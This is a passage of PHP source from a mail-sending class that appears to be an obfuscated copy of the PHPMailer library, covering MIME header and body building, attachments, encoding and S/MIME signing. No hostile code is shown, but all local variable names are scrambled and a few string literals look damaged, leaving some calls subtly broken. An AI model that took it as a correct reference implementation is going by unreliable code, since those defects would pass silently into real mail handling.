. sprintf('=%s', static::$LE); } else { $spd87485 = $sp321402; } } } else { $sp336aef = $spd87485; if (!$sp3c57d0) { $spd87485 .= ' '; } $spd87485 .= $sp6da2a2; if ('' !== $sp336aef && strlen($spd87485) > $spc872ec) { $sp7a9528 .= $sp336aef . $sp73e96d; $spd87485 = $sp6da2a2; } } $sp3c57d0 = false; } $sp7a9528 .= $spd87485 . static::$LE; } return $sp7a9528; } public function utf8CharBoundary($sp92ce8b, $sp33c3fb) { $sp3a9601 = false; $spe4ce4d = 3; while (!$sp3a9601) { $sp07fe09 = substr($sp92ce8b, $sp33c3fb - $spe4ce4d, $spe4ce4d); $spe494c0 = strpos($sp07fe09, '='); if (false !== $spe494c0) { $sp312ed5 = substr($sp92ce8b, $sp33c3fb - $spe4ce4d + $spe494c0 + 1, 2); $spc7a72c = hexdec($sp312ed5); if ($spc7a72c < 128) { if ($spe494c0 > 0) { $sp33c3fb -= $spe4ce4d - $spe494c0; } $sp3a9601 = true; } elseif ($spc7a72c >= 192) { $sp33c3fb -= $spe4ce4d - $spe494c0; $sp3a9601 = true; } elseif ($spc7a72c < 192) { $spe4ce4d += 3; } } else { $sp3a9601 = true; } } return $sp33c3fb; } public function setWordWrap() { if ($this->WordWrap < 1) { return; } switch ($this->message_type) { case 'alt': case 'alt_inline': case 'alt_attach': case 'alt_inline_attach': $this->AltBody = $this->wrapText($this->AltBody, $this->WordWrap); break; default: $this->Body = $this->wrapText($this->Body, $this->WordWrap); break; } } public function createHeader() { $spee7daf = ''; $spee7daf .= $this->headerLine('Date', '' === $this->MessageDate ? self::rfcDate() : $this->MessageDate); if ($this->SingleTo) { if ('mail' !== $this->Mailer) { foreach ($this->to as $sp34564a) { $this->SingleToArray[] = $this->addrFormat($sp34564a); } } } elseif (count($this->to) > 0) { if ('mail' !== $this->Mailer) { $spee7daf .= $this->addrAppend('To', $this->to); } } elseif (count($this->cc) === 0) { $spee7daf .= $this->headerLine('To', 'undisclosed-recipients:;'); } $spee7daf .= $this->addrAppend('From', array(array(trim($this->From), $this->FromName))); if (count($this->cc) > 0) { $spee7daf .= $this->addrAppend('Cc', $this->cc); } if (('sendmail' === $this->Mailer || 'qmail' === $this->Mailer || 'mail' === $this->Mailer) && count($this->bcc) > 0) { $spee7daf .= $this->addrAppend('Bcc', $this->bcc); } if (count($this->ReplyTo) > 0) { $spee7daf .= $this->addrAppend('Reply-To', $this->ReplyTo); } if ('mail' !== $this->Mailer) { $spee7daf .= $this->headerLine('Subject', $this->encodeHeader($this->secureHeader($this->Subject))); } if ('' !== $this->MessageID && preg_match('/^<.*@.*>$/', $this->MessageID)) { $this->lastMessageID = $this->MessageID; } else { $this->lastMessageID = sprintf('<%s@%s>', $this->uniqueid, $this->serverHostname()); } $spee7daf .= $this->headerLine('Message-ID', $this->lastMessageID); if (null !== $this->Priority) { $spee7daf .= $this->headerLine('X-Priority', $this->Priority); } if ('' !== $this->ConfirmReadingTo) { $spee7daf .= $this->headerLine('Disposition-Notification-To', '<' . $this->ConfirmReadingTo . '>'); } foreach ($this->CustomHeader as $sp40834a) { $spee7daf .= $this->headerLine(trim($sp40834a[0]), $this->encodeHeader(trim($sp40834a[1]))); } if (!$this->sign_key_file) { $spee7daf .= $this->headerLine('MIME-Version', '1.0'); $spee7daf .= $this->getMailMIME(); } return $spee7daf; } public function getMailMIME() { $spee7daf = ''; $spd02e1d = true; switch ($this->message_type) { case 'inline': $spee7daf .= $this->headerLine('Content-Type', static::CONTENT_TYPE_MULTIPART_RELATED . ';'); $spee7daf .= $this->textLine(' boundary="' . $this->boundary[1] . '"'); break; case 'attach': case 'inline_attach': case 'alt_attach': case 'alt_inline_attach': $spee7daf .= $this->headerLine('Content-Type', static::CONTENT_TYPE_MULTIPART_MIXED . ';'); $spee7daf .= $this->textLine(' boundary="' . $this->boundary[1] . '"'); break; case 'alt': case 'alt_inline': $spee7daf .= $this->headerLine('Content-Type', static::CONTENT_TYPE_MULTIPART_ALTERNATIVE . ';'); $spee7daf .= $this->textLine(' boundary="' . $this->boundary[1] . '"'); break; default: $spee7daf .= $this->textLine('Content-Type: ' . $this->ContentType . '; charset=' . $this->CharSet); $spd02e1d = false; break; } if (static::ENCODING_7BIT !== $this->Encoding) { if ($spd02e1d) { if (static::ENCODING_8BIT === $this->Encoding) { $spee7daf .= $this->headerLine('Content-Transfer-Encoding', static::ENCODING_8BIT); } } else { $spee7daf .= $this->headerLine('Content-Transfer-Encoding', $this->Encoding); } } if ('mail' !== $this->Mailer) { } return $spee7daf; } public function getSentMIMEMessage() { return static::stripTrailingWSP($this->MIMEHeader . $this->mailHeader) . static::$LE . static::$LE . $this->MIMEBody; } protected function generateId() { $sp36b4d9 = 32; $sp5340ee = ''; if (function_exists('random_bytes')) { try { $sp5340ee = random_bytes($sp36b4d9); } catch (\Exception $sp19dcb8) { } } elseif (function_exists('openssl_random_pseudo_bytes')) { $sp5340ee = openssl_random_pseudo_bytes($sp36b4d9); } if ($sp5340ee === '') { $sp5340ee = hash('sha256', uniqid((string) mt_rand(), true), true); } return str_replace(array('=', '+', '/'), '', base64_encode(hash('sha256', $sp5340ee, true))); } public function createBody() { $spf387a7 = ''; $this->uniqueid = $this->generateId(); $this->boundary[1] = 'b1_' . $this->uniqueid; $this->boundary[2] = 'b2_' . $this->uniqueid; $this->boundary[3] = 'b3_' . $this->uniqueid; if ($this->sign_key_file) { $spf387a7 .= $this->getMailMIME() . static::$LE; } $this->setWordWrap(); $spc24bee = $this->Encoding; $sp8169ea = $this->CharSet; if (static::ENCODING_8BIT === $spc24bee && !$this->has8bitChars($this->Body)) { $spc24bee = static::ENCODING_7BIT; $sp8169ea = static::CHARSET_ASCII; } if (static::ENCODING_BASE64 !== $this->Encoding && static::hasLineLongerThanMax($this->Body)) { $spc24bee = static::ENCODING_QUOTED_PRINTABLE; } $spa492d3 = $this->Encoding; $sp7e4e2a = $this->CharSet; if (static::ENCODING_8BIT === $spa492d3 && !$this->has8bitChars($this->AltBody)) { $spa492d3 = static::ENCODING_7BIT; $sp7e4e2a = static::CHARSET_ASCII; } if (static::ENCODING_BASE64 !== $spa492d3 && static::hasLineLongerThanMax($this->AltBody)) { $spa492d3 = static::ENCODING_QUOTED_PRINTABLE; } $spe1307e = 'This is a multi-part message in MIME format.' . static::$LE . static::$LE; switch ($this->message_type) { case 'inline': $spf387a7 .= $spe1307e; $spf387a7 .= $this->getBoundary($this->boundary[1], $sp8169ea, '', $spc24bee); $spf387a7 .= $this->encodeString($this->Body, $spc24bee); $spf387a7 .= static::$LE; $spf387a7 .= $this->attachAll('inline', $this->boundary[1]); break; case 'attach': $spf387a7 .= $spe1307e; $spf387a7 .= $this->getBoundary($this->boundary[1], $sp8169ea, '', $spc24bee); $spf387a7 .= $this->encodeString($this->Body, $spc24bee); $spf387a7 .= static::$LE; $spf387a7 .= $this->attachAll('attachment', $this->boundary[1]); break; case 'inline_attach': $spf387a7 .= $spe1307e; $spf387a7 .= $this->textLine('--' . $this->boundary[1]); $spf387a7 .= $this->headerLine('Content-Type', static::CONTENT_TYPE_MULTIPART_RELATED . ';'); $spf387a7 .= $this->textLine(' boundary="' . $this->boundary[2] . '";'); $spf387a7 .= $this->textLine(' type="' . static::CONTENT_TYPE_TEXT_HTML . '"'); $spf387a7 .= static::$LE; $spf387a7 .= $this->getBoundary($this->boundary[2], $sp8169ea, '', $spc24bee); $spf387a7 .= $this->encodeString($this->Body, $spc24bee); $spf387a7 .= static::$LE; $spf387a7 .= $this->attachAll('inline', $this->boundary[2]); $spf387a7 .= static::$LE; $spf387a7 .= $this->attachAll('attachment', $this->boundary[1]); break; case 'alt': $spf387a7 .= $spe1307e; $spf387a7 .= $this->getBoundary($this->boundary[1], $sp7e4e2a, static::CONTENT_TYPE_PLAINTEXT, $spa492d3); $spf387a7 .= $this->encodeString($this->AltBody, $spa492d3); $spf387a7 .= static::$LE; $spf387a7 .= $this->getBoundary($this->boundary[1], $sp8169ea, static::CONTENT_TYPE_TEXT_HTML, $spc24bee); $spf387a7 .= $this->encodeString($this->Body, $spc24bee); $spf387a7 .= static::$LE; if (!empty($this->Ical)) { $sp2b782e = static::ICAL_METHOD_REQUEST; foreach (static::$IcalMethods as $sp055553) { if (stripos($this->Ical, 'METHOD:' . $sp055553) !== false) { $sp2b782e = $sp055553; break; } } $spf387a7 .= $this->getBoundary($this->boundary[1], '', static::CONTENT_TYPE_TEXT_CALENDAR . '; method=' . $sp2b782e, ''); $spf387a7 .= $this->encodeString($this->Ical, $this->Encoding); $spf387a7 .= static::$LE; } $spf387a7 .= $this->endBoundary($this->boundary[1]); break; case 'alt_inline': $spf387a7 .= $spe1307e; $spf387a7 .= $this->getBoundary($this->boundary[1], $sp7e4e2a, static::CONTENT_TYPE_PLAINTEXT, $spa492d3); $spf387a7 .= $this->encodeString($this->AltBody, $spa492d3); $spf387a7 .= static::$LE; $spf387a7 .= $this->textLine('--' . $this->boundary[1]); $spf387a7 .= $this->headerLine('Content-Type', static::CONTENT_TYPE_MULTIPART_RELATED . ';'); $spf387a7 .= $this->textLine(' boundary="' . $this->boundary[2] . '";'); $spf387a7 .= $this->textLine(' type="' . static::CONTENT_TYPE_TEXT_HTML . '"'); $spf387a7 .= static::$LE; $spf387a7 .= $this->getBoundary($this->boundary[2], $sp8169ea, static::CONTENT_TYPE_TEXT_HTML, $spc24bee); $spf387a7 .= $this->encodeString($this->Body, $spc24bee); $spf387a7 .= static::$LE; $spf387a7 .= $this->attachAll('inline', $this->boundary[2]); $spf387a7 .= static::$LE; $spf387a7 .= $this->endBoundary($this->boundary[1]); break; case 'alt_attach': $spf387a7 .= $spe1307e; $spf387a7 .= $this->textLine('--' . $this->boundary[1]); $spf387a7 .= $this->headerLine('Content-Type', static::CONTENT_TYPE_MULTIPART_ALTERNATIVE . ';'); $spf387a7 .= $this->textLine(' boundary="' . $this->boundary[2] . '"'); $spf387a7 .= static::$LE; $spf387a7 .= $this->getBoundary($this->boundary[2], $sp7e4e2a, static::CONTENT_TYPE_PLAINTEXT, $spa492d3); $spf387a7 .= $this->encodeString($this->AltBody, $spa492d3); $spf387a7 .= static::$LE; $spf387a7 .= $this->getBoundary($this->boundary[2], $sp8169ea, static::CONTENT_TYPE_TEXT_HTML, $spc24bee); $spf387a7 .= $this->encodeString($this->Body, $spc24bee); $spf387a7 .= static::$LE; if (!empty($this->Ical)) { $sp2b782e = static::ICAL_METHOD_REQUEST; foreach (static::$IcalMethods as $sp055553) { if (stripos($this->Ical, 'METHOD:' . $sp055553) !== false) { $sp2b782e = $sp055553; break; } } $spf387a7 .= $this->getBoundary($this->boundary[2], '', static::CONTENT_TYPE_TEXT_CALENDAR . '; method=' . $sp2b782e, ''); $spf387a7 .= $this->encodeString($this->Ical, $this->Encoding); } $spf387a7 .= $this->endBoundary($this->boundary[2]); $spf387a7 .= static::$LE; $spf387a7 .= $this->attachAll('attachment', $this->boundary[1]); break; case 'alt_inline_attach': $spf387a7 .= $spe1307e; $spf387a7 .= $this->textLine('--' . $this->boundary[1]); $spf387a7 .= $this->headerLine('Content-Type', static::CONTENT_TYPE_MULTIPART_ALTERNATIVE . ';'); $spf387a7 .= $this->textLine(' boundary="' . $this->boundary[2] . '"'); $spf387a7 .= static::$LE; $spf387a7 .= $this->getBoundary($this->boundary[2], $sp7e4e2a, static::CONTENT_TYPE_PLAINTEXT, $spa492d3); $spf387a7 .= $this->encodeString($this->AltBody, $spa492d3); $spf387a7 .= static::$LE; $spf387a7 .= $this->textLine('--' . $this->boundary[2]); $spf387a7 .= $this->headerLine('Content-Type', static::CONTENT_TYPE_MULTIPART_RELATED . ';'); $spf387a7 .= $this->textLine(' boundary="' . $this->boundary[3] . '";'); $spf387a7 .= $this->textLine(' type="' . static::CONTENT_TYPE_TEXT_HTML . '"'); $spf387a7 .= static::$LE; $spf387a7 .= $this->getBoundary($this->boundary[3], $sp8169ea, static::CONTENT_TYPE_TEXT_HTML, $spc24bee); $spf387a7 .= $this->encodeString($this->Body, $spc24bee); $spf387a7 .= static::$LE; $spf387a7 .= $this->attachAll('inline', $this->boundary[3]); $spf387a7 .= static::$LE; $spf387a7 .= $this->endBoundary($this->boundary[2]); $spf387a7 .= static::$LE; $spf387a7 .= $this->attachAll('attachment', $this->boundary[1]); break; default: $this->Encoding = $spc24bee; $spf387a7 .= $this->encodeString($this->Body, $this->Encoding); break; } if ($this->isError()) { $spf387a7 = ''; if ($this->exceptions) { throw new Exception($this->lang('empty_message'), self::STOP_CRITICAL); } } elseif ($this->sign_key_file) { try { if (!defined('PKCS7_TEXT')) { throw new Exception($this->lang('extension_missing') . 'openssl'); } $specc297 = tempnam(sys_get_temp_dir(), 'srcsign'); $sp4e3a5e = tempnam(sys_get_temp_dir(), 'mailsign'); file_put_contents($specc297, $spf387a7); if (empty($this->sign_extracerts_file)) { $sp54a0b8 = @openssl_pkcs7_sign($specc297, $sp4e3a5e, 'file://' . realpath($this->sign_cert_file), array('file://' . realpath($this->sign_key_file), $this->sign_key_pass), array()); } else { $sp54a0b8 = @openssl_pkcs7_sign($specc297, $sp4e3a5e, 'file://' . realpath($this->sign_cert_file), array('file://' . realpath($this->sign_key_file), $this->sign_key_pass), array(), PKCS7_DETACHED, $this->sign_extracerts_file); } @unlink($specc297); if ($sp54a0b8) { $spf387a7 = file_get_contents($sp4e3a5e); @unlink($sp4e3a5e); $sp783135 = explode('

', $spf387a7, 2); $this->MIMEHeader .= $sp783135[0] . static::$LE . static::$LE; $spf387a7 = $sp783135[1]; } else { @unlink($sp4e3a5e); throw new Exception($this->lang('signing') . openssl_error_string()); } } catch (Exception $spb3d816) { $spf387a7 = ''; if ($this->exceptions) { throw $spb3d816; } } } return $spf387a7; } protected function getBoundary($sp7948b9, $spe11879, $sp6ab046, $spd03d38) { $spee7daf = ''; if ('' === $spe11879) { $spe11879 = $this->CharSet; } if ('' === $sp6ab046) { $sp6ab046 = $this->ContentType; } if ('' === $spd03d38) { $spd03d38 = $this->Encoding; } $spee7daf .= $this->textLine('--' . $sp7948b9); $spee7daf .= sprintf('Content-Type: %s; charset=%s', $sp6ab046, $spe11879); $spee7daf .= static::$LE; if (static::ENCODING_7BIT !== $spd03d38) { $spee7daf .= $this->headerLine('Content-Transfer-Encoding', $spd03d38); } $spee7daf .= static::$LE; return $spee7daf; } protected function endBoundary($sp7948b9) { return static::$LE . '--' . $sp7948b9 . '--' . static::$LE; } protected function setMessageType() { $sp0df7d0 = array(); if ($this->alternativeExists()) { $sp0df7d0[] = 'alt'; } if ($this->inlineImageExists()) { $sp0df7d0[] = 'inline'; } if ($this->attachmentExists()) { $sp0df7d0[] = 'attach'; } $this->message_type = implode('_', $sp0df7d0); if ('' === $this->message_type) { $this->message_type = 'plain'; } } public function headerLine($spab4c5e, $spe356e4) { return $spab4c5e . ': ' . $spe356e4 . static::$LE; } public function textLine($spe356e4) { return $spe356e4 . static::$LE; } public function addAttachment($sp671dee, $spab4c5e = '', $spd03d38 = self::ENCODING_BASE64, $sp0df7d0 = '', $sp306469 = 'attachment') { try { if (!static::isPermittedPath($sp671dee) || !@is_file($sp671dee) || !is_readable($sp671dee)) { throw new Exception($this->lang('file_access') . $sp671dee, self::STOP_CONTINUE); } if ('' === $sp0df7d0) { $sp0df7d0 = static::filenameToType($sp671dee); } $sp1f19c7 = (string) static::mb_pathinfo($sp671dee, PATHINFO_BASENAME); if ('' === $spab4c5e) { $spab4c5e = $sp1f19c7; } if (!$this->validateEncoding($spd03d38)) { throw new Exception($this->lang('encoding') . $spd03d38); } $this->attachment[] = array(0 => $sp671dee, 1 => $sp1f19c7, 2 => $spab4c5e, 3 => $spd03d38, 4 => $sp0df7d0, 5 => false, 6 => $sp306469, 7 => $spab4c5e); } catch (Exception $spb3d816) { $this->setError($spb3d816->getMessage()); $this->edebug($spb3d816->getMessage()); if ($this->exceptions) { throw $spb3d816; } return false; } return true; } public function getAttachments() { return $this->attachment; } protected function attachAll($sp34adf3, $sp7948b9) { $spe49c49 = array(); $sp8c231a = array(); $spc33615 = array(); foreach ($this->attachment as $spa225cc) { if ($spa225cc[6] === $sp34adf3) { $spb2f62c = ''; $sp671dee = ''; $sp2c3525 = $spa225cc[5]; if ($sp2c3525) { $spb2f62c = $spa225cc[0]; } else { $sp671dee = $spa225cc[0]; } $spa08b7e = hash('sha256', serialize($spa225cc)); if (in_array($spa08b7e, $spc33615, true)) { continue; } $spc33615[] = $spa08b7e; $spab4c5e = $spa225cc[2]; $spd03d38 = $spa225cc[3]; $sp0df7d0 = $spa225cc[4]; $sp306469 = $spa225cc[6]; $speedae8 = $spa225cc[7]; if ('inline' === $sp306469 && array_key_exists($speedae8, $sp8c231a)) { continue; } $sp8c231a[$speedae8] = true; $spe49c49[] = sprintf('--%s%s', $sp7948b9, static::$LE); if (!empty($spab4c5e)) { $spe49c49[] = sprintf('Content-Type: %s; name=%s%s', $sp0df7d0, static::quotedString($this->encodeHeader($this->secureHeader($spab4c5e))), static::$LE); } else { $spe49c49[] = sprintf('Content-Type: %s%s', $sp0df7d0, static::$LE); } if (static::ENCODING_7BIT !== $spd03d38) { $spe49c49[] = sprintf('Content-Transfer-Encoding: %s%s', $spd03d38, static::$LE); } if ((string) $speedae8 !== '' && $sp306469 === 'inline') { $spe49c49[] = 'Content-ID: <' . $this->encodeHeader($this->secureHeader($speedae8)) . '>' . static::$LE; } if (!empty($sp306469)) { $sp5cb0d9 = $this->encodeHeader($this->secureHeader($spab4c5e)); if (!empty($sp5cb0d9)) { $spe49c49[] = sprintf('Content-Disposition: %s; filename=%s%s', $sp306469, static::quotedString($sp5cb0d9), static::$LE . static::$LE); } else { $spe49c49[] = sprintf('Content-Disposition: %s%s', $sp306469, static::$LE . static::$LE); } } else { $spe49c49[] = static::$LE; } if ($sp2c3525) { $spe49c49[] = $this->encodeString($spb2f62c, $spd03d38); } else { $spe49c49[] = $this->encodeFile($sp671dee, $spd03d38); } if ($this->isError()) { return ''; } $spe49c49[] = static::$LE; } } $spe49c49[] = sprintf('--%s--%s', $sp7948b9, static::$LE); return implode('', $spe49c49); } protected function encodeFile($sp671dee, $spd03d38 = self::ENCODING_BASE64) { try { if (!static::isPermittedPath($sp671dee) || !file_exists($sp671dee) || !is_readable($sp671dee)) { throw new Exception($this->lang('file_open') . $sp671dee, self::STOP_CONTINUE); } $spbf88d6 = file_get_contents($sp671dee); if (false === $spbf88d6) { throw new Exception($this->lang('file_open') . $sp671dee, self::STOP_CONTINUE); } $spbf88d6 = $this->encodeString($spbf88d6, $spd03d38); return $spbf88d6; } catch (Exception $spb3d816) { $this->setError($spb3d816->getMessage()); $this->edebug($spb3d816->getMessage()); if ($this->exceptions) { throw $spb3d816; } return ''; } } public function encodeString($spc2c611, $spd03d38 = self::ENCODING_BASE64) { $sp1064e3 = ''; switch (strtolower($spd03d38)) { case static::ENCODING_BASE64: $sp1064e3 = chunk_split(base64_encode($spc2c611), static::STD_LINE_LENGTH, static::$LE); break; case static::ENCODING_7BIT: case static::ENCODING_8BIT: $sp1064e3 = static::normalizeBreaks($spc2c611); if (substr($sp1064e3, -strlen(static::$LE)) !== static::$LE) { $sp1064e3 .= static::$LE; } break; case static::ENCODING_BINARY: $sp1064e3 = $spc2c611; break; case static::ENCODING_QUOTED_PRINTABLE: $sp1064e3 = $this->encodeQP($spc2c611); break; default: $this->setError($this->lang('encoding') . $spd03d38); if ($this->exceptions) { throw new Exception($this->lang('encoding') . $spd03d38); } break; } return $sp1064e3; } public function encodeHeader($spc2c611, $sp406ef6 = 'text') { $sp3f3e27 = 0; switch (strtolower($sp406ef6)) { case 'phrase': if (!preg_match('/[\\200-\\377]/', $spc2c611)) { $sp1064e3 = addcslashes($spc2c611, ' ..\\"'); if ($spc2c611 === $sp1064e3 && !preg_match('/[^A-Za-z0-9!#$%&\'*+\\/=?^_`{|}~ -]/', $spc2c611)) { return $sp1064e3; } return "\"{$sp1064e3}\""; } $sp3f3e27 = preg_match_all('/[^\\040\\041\\043-\\133\\135-\\176]/', $spc2c611, $spae1c48); break; case 'comment': $sp3f3e27 = preg_match_all('/[()"]/', $spc2c611, $spae1c48); case 'text': default: $sp3f3e27 += preg_match_all('/[\\000-\\010\\013\\014\\016-\\037\\177-\\377]/', $spc2c611, $spae1c48); break; } if ($this->has8bitChars($spc2c611)) { $sp1b2355 = $this->CharSet; } else { $sp1b2355 = static::CHARSET_ASCII; } $sp03ed1f = 8 + strlen($sp1b2355); if ('mail' === $this->Mailer) { $sp392053 = static::MAIL_MAX_LINE_LENGTH - $sp03ed1f; } else { $sp392053 = static::MAX_LINE_LENGTH - $sp03ed1f; } if ($sp3f3e27 > strlen($spc2c611) / 3) { $spd03d38 = 'B'; } elseif ($sp3f3e27 > 0) { $spd03d38 = 'Q'; } elseif (strlen($spc2c611) > $sp392053) { $spd03d38 = 'Q'; } else { $spd03d38 = false; } switch ($spd03d38) { case 'B': if ($this->hasMultiBytes($spc2c611)) { $sp1064e3 = $this->base64EncodeWrapMB($spc2c611, '
'); } else { $sp1064e3 = base64_encode($spc2c611); $sp392053 -= $sp392053 % 4; $sp1064e3 = trim(chunk_split($sp1064e3, $sp392053, '
')); } $sp1064e3 = preg_replace('/^(.*)$/m', ' =?' . $sp1b2355 . "?{$spd03d38}?\\1?=", $sp1064e3); break; case 'Q': $sp1064e3 = $this->encodeQ($spc2c611, $sp406ef6); $sp1064e3 = $this->wrapText($sp1064e3, $sp392053, true); $sp1064e3 = str_replace('=' . static::$LE, '
', trim($sp1064e3)); $sp1064e3 = preg_replace('/^(.*)$/m', ' =?' . $sp1b2355 . "?{$spd03d38}?\\1?=", $sp1064e3); break; default: return $spc2c611; } return trim(static::normalizeBreaks($sp1064e3)); } public function hasMultiBytes($spc2c611) { if (function_exists('mb_strlen')) { return strlen($spc2c611) > mb_strlen($spc2c611, $this->CharSet); } return false; } public function has8bitChars($spe0e0a3) { return (bool) preg_match('/[\\x80-\\xFF]/', $spe0e0a3); } public function base64EncodeWrapMB($spc2c611, $spe626d4 = null) { $sp7866f8 = '=?' . $this->CharSet . '?B?'; $spcddd8b = '?='; $sp1064e3 = ''; if (null === $spe626d4) { $spe626d4 = static::$LE; } $sp6f6238 = mb_strlen($spc2c611, $this->CharSet); $spc872ec = 75 - strlen($sp7866f8) - strlen($spcddd8b); $spb38857 = $sp6f6238 / strlen($spc2c611); $spa25d18 = floor($spc872ec * $spb38857 * 0.75); $sp554cac = 0; for ($sp4ed825 = 0; $sp4ed825 < $sp6f6238; $sp4ed825 += $sp554cac) { $spe4ce4d = 0; do { $sp554cac = $spa25d18 - $spe4ce4d; $spe1bfe2 = mb_substr($spc2c611, $sp4ed825, $sp554cac, $this->CharSet); $spe1bfe2 = base64_encode($spe1bfe2); ++$spe4ce4d; } while (strlen($spe1bfe2) > $spc872ec); $sp1064e3 .= $spe1bfe2 . $spe626d4; } return substr($sp1064e3, 0, -strlen($spe626d4)); } public function encodeQP($spb2f62c) { return static::normalizeBreaks(quoted_printable_encode($spb2f62c)); } public function encodeQ($spc2c611, $sp406ef6 = 'text') { $spcd1170 = ''; $sp1064e3 = str_replace(array('', '
'), '', $spc2c611); switch (strtolower($sp406ef6)) { case 'phrase': $spcd1170 = '^A-Za-z0-9!*+\\/ -'; break; case 'comment': $spcd1170 = '\\(\\)"'; case 'text': default: $spcd1170 = '\\000-\\011\\013\\014\\016-\\037\\075\\077\\137\\177-\\377' . $spcd1170; break; } $spae1c48 = array(); if (preg_match_all("/[{$spcd1170}]/", $sp1064e3, $spae1c48)) { $sp0563f0 = array_search('=', $spae1c48[0], true); if (false !== $sp0563f0) { unset($spae1c48[0][$sp0563f0]); array_unshift($spae1c48[0], '='); } foreach (array_unique($spae1c48[0]) as $sp77b582) { $sp1064e3 = str_replace($sp77b582, '=' . sprintf('%02X', ord($sp77b582)), $sp1064e3); } } return str_replace(' ', '_', $sp1064e3); } public function addStringAttachment($spb2f62c, $sp1f19c7, $spd03d38 = self::ENCODING_BASE64, $sp0df7d0 = '', $sp306469 = 'attachment') { try { if ('' === $sp0df7d0) { $sp0df7d0 = static::filenameToType($sp1f19c7); } if (!$this->validateEncoding($spd03d38)) { throw new Exception($this->lang('encoding') . $spd03d38); } $this->attachment[] = array(0 => $spb2f62c, 1 => $sp1f19c7, 2 => static::mb_pathinfo($sp1f19c7, PATHINFO_BASENAME), 3 => $spd03d38, 4 => $sp0df7d0, 5 => true, 6 => $sp306469, 7 => 0); } catch (Exception $spb3d816) { $this->setError($spb3d816->getMessage()); $this->edebug($spb3d816->getMessage()); if ($this->exceptions) { throw $spb3d816; } return false; } return true; } public function addEmbeddedImage($sp671dee, $speedae8, $spab4c5e = '', $spd03d38 = self::ENCODING_BASE64, $sp0df7d0 = '', $sp306469 = 'inline') { try { if (!static::isPermittedPath($sp671dee) || !@is_file($sp671dee) || !is_readable($sp671dee)) { throw new Exception($this->lang('file_access') . $sp671dee, self::STOP_CONTINUE); } if ('' === $sp0df7d0) { $sp0df7d0 = static::filenameToType($sp671dee); } if (!$this->validateEncoding($spd03d38)) { throw new Exception($this->lang('encoding') . $spd03d38); } $sp1f19c7 = (string) static::mb_pathinfo($sp671dee, PATHINFO_BASENAME); if ('' === $spab4c5e) { $spab4c5e = $sp1f19c7; } $this->attachment[] = array(0 => $sp671dee, 1 => $sp1f19c7, 2 => $spab4c5e, 3 => $spd03d38, 4 => $sp0df7d0, 5 => false, 6 => $sp306469, 7 => $speedae8); } catch (Exception $spb3d816) { $this->setError($spb3d816->getMessage()); $this->edebug($spb3d816->getMessage()); if ($this->exceptions) { throw $spb3d816; } return false; } return true; } public function addStringEmbeddedImage($spb2f62c, $speedae8, $spab4c5e = '', $spd03d38 = self::ENCODING_BASE64, $sp0df7d0 = '', $sp306469 = 'inline') { try { if ('' === $sp0df7d0 && !empty($spab4c5e)) { $sp0df7d0 = static::filenameToType($spab4c5e); } if (!$this->validateEncoding($spd03d38)) { throw new Exception($this->lang('encoding') . $spd03d38); } $this->attachment[] = array(0 => $spb2f62c, 1 => $spab4c5e, 2 => $spab4c5e, 3 => $spd03d38, 4 => $sp0df7d0, 5 => true, 6 => $sp306469, 7 => $speedae8); } catch (Exception $spb3d816) { $this->setError($spb3d816->getMessage()); $this->edebug($spb3d816->getMessage()); if ($this->exceptions) { throw $spb3d816; } return false; } return true; } protected function validateEncoding($spd03d38) { return in_array($spd03d38, array(self::ENCODING_7BIT, self::ENCODING_QUOTED_PRINTABLE, self::ENCODING_BASE64, self::ENCODING_8BIT, self::ENCODING_BINARY), true); } protected function cidExists($speedae8) { foreach ($this->attachment as $spa225cc) { if ('inline' === $spa225cc[6] && $speedae8 === $spa225cc[7]) { return true; } } return false; } public function inlineImageExists() { foreach ($this->attachment as $spa225cc) { if ('inline' === $spa225cc[6]) { return true; } } return false; } public function attachmentExists() { foreach ($this->attachment as $spa225cc) { if ('attachment' === $spa225cc[6]) { return true; } } return false; } public function alternativeExists() { return !empty($this->AltBody); } public function clearQueuedAddresses($spd680a0) { $this->RecipientsQueue = array_filter($this->RecipientsQueue, static function ($sp848dbc) use($spd680a0) { return $sp848dbc[0] !== $spd680a0; }); } public function clearAddresses() { foreach ($this->to as $sp22e9ba) { unset($this->all_recipients[strtolower($sp22e9ba[0])]); } $this->to = array(); $this->clearQueuedAddresses('to'); } public function clearCCs() { foreach ($this->cc as $sp4b939e) { unset($this->all_recipients[strtolower($sp4b939e[0])]); } $this->cc = array(); $this->clearQueuedAddresses('cc'); } public function clearBCCs() { foreach ($this->bcc as $spa9d70d) { unset($this->all_recipients[strtolower($spa9d70d[0])]); } $this->bcc = array(); $this->clearQueuedAddresses('bcc'); } public function clearReplyTos() { $this->ReplyTo = array(); $this->ReplyToQueue = array(); } public function clearAllRecipients() { $this->to = array(); $this->cc = array(); $this->bcc = array(); $this->all_recipients = array(); $this->RecipientsQueue = array(); } public function clearAttachments() { $this->attachment = array(); } public function clearCustomHeaders() { $this->CustomHeader = array(); } protected function setError($sp3a37b7) { ++$this->error_count; if ('smtp' === $this->Mailer && null !== $this->smtp) { $spf36618 = $this->smtp->getError(); if (!empty($spf36618['error'])) { $sp3a37b7 .= $this->lang('smtp_error') . $spf36618['error']; if (!empty($spf36618['detail'])) { $sp3a37b7 .= ' Detail: ' . $spf36618['detail']; } if (!empty($spf36618['smtp_code'])) { $sp3a37b7 .= ' SMTP code: ' . $spf36618['smtp_code']; } if (!empty($spf36618['smtp_code_ex'])) { $sp3a37b7 .= ' Additional SMTP info: ' . $spf36618['smtp_code_ex']; } } } $this->ErrorInfo = $sp3a37b7; } public static function rfcDate() { date_default_timezone_set(@date_default_timezone_get()); return date('D, j M Y H:i:s O'); } protected function serverHostname() { $spee7daf = ''; if (!empty($this->Hostname)) { $spee7daf = $this->Hostname; } elseif (isset($_SERVER) && array_key_exists('SERVER_NAME', $_SERVER)) { $spee7daf = $_SERVER['SERVER_NAME']; } elseif (function_exists('gethostname') && gethostname() !== false) { $spee7daf = gethostname(); } elseif (php_uname('n') !== false) { $spee7daf = php_uname('n'); } if (!static::isValidHost($spee7daf)) { return 'localhost.localdomain'; } return $spee7daf; } public static function isValidHost($spe005e4) { if (empty($spe005e4) || !is_string($spe005e4) || strlen($spe005e4) > 256 || !preg_match('/^([a-zA-Z\\d.-]*|\\[[a-fA-F\\d:]+])$/', $spe005e4)) { return false; } if (strlen($spe005e4) > 2 && substr($spe005e4, 0, 1) === '[' && substr($spe005e4, -1, 1) === ']') { return filter_var(substr($spe005e4, 1, -1), FILTER_VALIDATE_IP, FILTER_FLAG_IPV6) !== false; } if (is_numeric(str_replace('.', '', $spe005e4))) { return filter_var($spe005e4, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4) !== false; } if 